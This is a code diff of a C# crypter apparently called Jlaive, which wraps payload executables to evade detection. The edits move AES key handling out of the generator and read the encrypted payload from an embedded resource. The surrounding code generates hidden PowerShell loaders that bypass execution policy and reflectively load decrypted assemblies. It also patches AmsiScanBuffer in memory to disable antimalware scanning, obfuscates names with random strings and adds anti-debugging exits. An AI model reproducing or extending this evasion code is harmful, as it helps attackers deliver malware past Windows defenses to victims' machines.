@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Security.Cryptography;
 using System.Text;
 
 using static Jlaive.Utils;
@@ -20,7 +19,7 @@ namespace Jlaive
             return $"pshell.exe -noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ${varname} = (Get-Content -path '%~f0' -raw).Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), [System.Convert]::FromBase64String('{Convert.ToBase64String(key)}'), [System.Convert]::FromBase64String('{Convert.ToBase64String(iv)}')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
         }
 
-        public static string CreateCS(byte[] pbytes, bool bamsi, bool antidebug, Random rng)
+        public static string CreateCS(byte[] key, byte[] iv, bool bamsi, bool antidebug, Random rng)
         {
             string namespacename = RandomString(10, rng);
             string classname = RandomString(10, rng);
@@ -30,14 +29,12 @@ namespace Jlaive
             string checkremotedebugger = RandomString(10, rng);
             string isdebuggerpresent = RandomString(10, rng);
 
-            AesManaged aes = new AesManaged();
-            string encrypted = Convert.ToBase64String(Encrypt(Compress(pbytes), aes.Key, aes.IV));
-            string amsiscanbuffer_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), aes.Key, aes.IV));
-            string checkremotedebugger_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), aes.Key, aes.IV));
-            string isdebuggerpresent_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), aes.Key, aes.IV));
-            string key_str = Convert.ToBase64String(aes.Key);
-            string iv_str = Convert.ToBase64String(aes.IV);
-            aes.Dispose();
+            string amsiscanbuffer_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key, iv));
+            string checkremotedebugger_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key, iv));
+            string isdebuggerpresent_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), key, iv));
+            string key_str = Convert.ToBase64String(key);
+            string iv_str = Convert.ToBase64String(iv);
+
             return @"using System;
 using System.Diagnostics;
 using System.Text;
@@ -60,8 +57,6 @@ namespace " + namespacename + @"
         " + (bamsi ? $"delegate bool {virtualprotect}(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" : string.Empty) + @"
         " + (antidebug ? $"delegate bool {checkremotedebugger}(IntPtr hProcess, ref bool isDebuggerPresent);" : string.Empty) + @"
         " + (antidebug ? $"delegate bool {isdebuggerpresent}();" : string.Empty) + @"
-
-        static string payload = """ + encrypted + @""";
 
         static void Main(string[] args)
         {
@@ -90,6 +85,10 @@ if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(
             Marshal.Copy(patch, 0, asbaddr, patch.Length);
             VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);" : string.Empty) + @"
 
+            Assembly asm = Assembly.GetExecutingAssembly();
+            StreamReader reader = new StreamReader(asm.GetManifestResourceStream(""payload.txt""));
+            string payload = reader.ReadToEnd();
+            reader.Dispose();
             MethodInfo entry = Assembly.Load(" + uncompressfunction + @"(" + aesfunction + @"(Convert.FromBase64String(payload), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @""")))).EntryPoint;
             try { entry.Invoke(null, new object[] { args[0].Split(' ') }); }
             catch { entry.Invoke(null, null); }
